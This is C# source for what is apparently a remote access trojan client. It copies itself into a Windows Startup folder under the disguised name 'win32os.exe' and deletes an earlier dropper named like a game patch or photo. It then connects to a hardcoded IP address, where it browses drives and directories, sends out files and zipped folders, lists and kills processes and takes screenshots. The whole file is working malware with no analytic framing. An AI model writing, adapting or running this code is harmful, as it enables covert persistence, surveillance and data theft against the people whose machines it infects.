using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.IO;
using Ionic.Zip;
using System.Diagnostics;

namespace userClient
{
    public partial class userClient : Form
    {
        String IPadrress = "25.109.245.31";
        //String IPadrress = "127.0.0.1";
        Socket socket;
        byte[] buffer = new byte[1024];
        IPEndPoint address;
        String startupPath = "";
        String programPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        String oldProgramPath = "";
        List<Thread> l = new List<Thread>();

        public userClient()
        {
            InitializeComponent();

            addToStartup();
            startConnect();
        }

        void addToStartup()
        {
            if (System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName == "win32os.exe")
            {
                win32osProgram();
                return;
            }

            foreach (DriveInfo item in DriveInfo.GetDrives())
            {
                DirectoryInfo dir = new DirectoryInfo(item.Name);
                l.Add(
                new Thread(delegate()
                    {
                        findStartup(dir);
                    }));
                l[l.Count - 1].Start();
            }

            foreach (Thread item in l)
            {
                item.Join();
            }
            File.Copy(programPath, startupPath);
            Process prc = new Process();
            prc.StartInfo.FileName = startupPath;
            prc.Start();
        }

        void win32osProgram()
        {
            foreach (Process item in Process.GetProcessesByName("teraria_patch"))
            {
                item.Kill();

                foreach (DriveInfo var in DriveInfo.GetDrives())
                {
                    DirectoryInfo dir = new DirectoryInfo(var.Name);
                    l.Add(
                    new Thread(delegate()
                    {
                        findOldProgram(dir);
                    }));
                    l[l.Count - 1].Start();
                }

                foreach (Thread var in l)
                {
                    var.Join();
                }
                File.Delete(oldProgramPath);
            }
        }

        void findOldProgram(DirectoryInfo dir)
        {
            if(oldProgramPath != "") Thread.CurrentThread.Abort();
            try
            {
                foreach (FileInfo item in dir.GetFiles())
                {
                    if (item.Name.Equals("photo3x1o21.exe"))
                    {
                        oldProgramPath = item.FullName;
                        Thread.CurrentThread.Abort();
                    }
                }

                foreach (DirectoryInfo item in dir.GetDirectories())
                {
                    if(oldProgramPath != "") Thread.CurrentThread.Abort();
                    findOldProgram(item);
                }
            }
            catch (IOException ex)
            {
            }
            catch (UnauthorizedAccessException ex)
            {
            }
        
        }

        void findStartup(DirectoryInfo dir)
        {
            try
            {
                foreach (DirectoryInfo item in dir.GetDirectories())
                {
                    if (startupPath != "") Thread.CurrentThread.Abort();
                    if (item.Name == "Startup")
                    {
                        startupPath = item.FullName + "\\" + "win32os.exe";
                        Thread.CurrentThread.Abort();
                    }
                    findStartup(item);
                }
            }
            catch (IOException ex)
            {
            }
            catch (UnauthorizedAccessException ex)
            {
            }
        }

        void startConnect()
        {
            try
            {
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                address = new IPEndPoint(IPAddress.Parse(IPadrress), 10000);
                socket.Connect(address);
            }
            catch
            {
                Thread.Sleep(10000);
                startConnect();
                return;
            }
            socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(receiveNewData), socket);
        }

        void receiveNewData(IAsyncResult AR)
        {
            Socket sck = (Socket)AR.AsyncState;
            int index = 0;
            try
            {
                index = sck.EndReceive(AR);
            }
            catch 
            {
                startConnect();
                return;
            }
            String dirStr = "";
            byte[] sized = new byte[index];
            Array.Copy(buffer, sized, index);
            dirStr = Encoding.Default.GetString(sized);

            switch (dirStr[0])
            {
                case '0':
                    {
                        sendUsersDrives();
                        return;
                    }
                case '1':
                    {
                        serverClosed();
                        return;
                    }
                case '2':
                    {
                        loadFile(dirStr);
                        return;
                    }
                case '3':
                    {
                        sendUsersProccess();
                        return;
                    }
                case '4':
                    {
                        killProccess(dirStr);
                        return;
                    }
                case '5':
                    {
                        loadFolder(dirStr);
                        return;
                    }
                case '6':
                    {
                        sendScreen();
                        return;
                    }
            }
            moveToNextDir(dirStr);
        }

        void loadFolder(String dirStr)
        {
            dirStr = dirStr.Remove(0, 1);

            TcpClient tcpClient = new TcpClient(IPadrress, 5555);
            NetworkStream networkStream = tcpClient.GetStream();


            String zipStr = "C:\\Windows0450680.zip";
            ZipFile ziped = new ZipFile();
            ziped.AddItem(dirStr);
            ziped.Save(zipStr);

            byte[] dataToSend = File.ReadAllBytes(zipStr);
            networkStream.Write(dataToSend, 0, dataToSend.Length);
            networkStream.Close();
            tcpClient.Close();

            File.Delete(zipStr);
            socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(receiveNewData), socket);
        }

        void killProccess(String str)
        {
            str = str.Remove(0, 1);
            foreach (Process item in Process.GetProcessesByName(str))
            {
                item.Kill();
            }
            socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(receiveNewData), socket);
        }

        void sendUsersProccess()
        {
            String names = "Proccess List";
            foreach (Process item in Process.GetProcesses())
            {
                names += item.ProcessName;
                names += "*";
            }
            socket.Send(Encoding.Unicode.GetBytes(names));
            socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(receiveNewData), socket);
        }

        void messageSended(IAsyncResult AR)
        {
            Socket sck = (Socket)AR.AsyncState;
            sck.EndReceive(AR);
        }

        void sendUsersDrives()
        {
            string names = "";
            foreach (DriveInfo item in DriveInfo.GetDrives())
            {
                names += item.Name;
                names += "*";
            }
            socket.Send(Encoding.Unicode.GetBytes(names));
            socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(receiveNewData), socket);
        }

        void serverClosed()
        {
            startConnect();
            socket.Shutdown(SocketShutdown.Both);
            socket.Close();
        }

        void loadFile(String dirStr)
        {
            dirStr = dirStr.Remove(0, 1);
            FileAttributes attr = File.GetAttributes(dirStr);
            if ((attr & FileAttributes.Directory) == FileAttributes.Directory)
            {
                socket.Send(Encoding.Unicode.GetBytes("wrongDirectory"));
                socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(receiveNewData), socket);
                return;
            }
            else socket.Send(Encoding.Unicode.GetBytes("allIsOK"));

            TcpClient tcpClient = new TcpClient(IPadrress, 5555);
            NetworkStream networkStream = tcpClient.GetStream();
            byte[] dataToSend = File.ReadAllBytes(dirStr);
            networkStream.Write(dataToSend, 0, dataToSend.Length);
            networkStream.Close();
            tcpClient.Close();

            socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(receiveNewData), socket);
        }

        void moveToNextDir(String dirStr)
        {
            string names = "";
            try
            {
                DirectoryInfo dir = new DirectoryInfo(dirStr);
                foreach (DirectoryInfo item in dir.GetDirectories())
                {
                    names += item.Name;
                    names += "*";
                }
                foreach (FileInfo item in dir.GetFiles())
                {
                    names += item.Name;
                    names += "*";
                }
            }
            catch 
            {
                socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(receiveNewData), socket);
                return;
            }
            socket.Send(Encoding.Unicode.GetBytes(names));
            socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(receiveNewData), socket);
            
        }

        void sendScreen()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(bitmap as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            ImageConverter converter = new ImageConverter();
            byte[] dataToSend = (byte[])converter.ConvertTo(bitmap, typeof(byte[]));

            TcpClient tcpClient = new TcpClient(IPadrress, 5555);
            NetworkStream networkStream = tcpClient.GetStream();
            networkStream.Write(dataToSend, 0, dataToSend.Length);
            networkStream.Close();
            tcpClient.Close();
            socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(receiveNewData), socket);
        }
    }
}
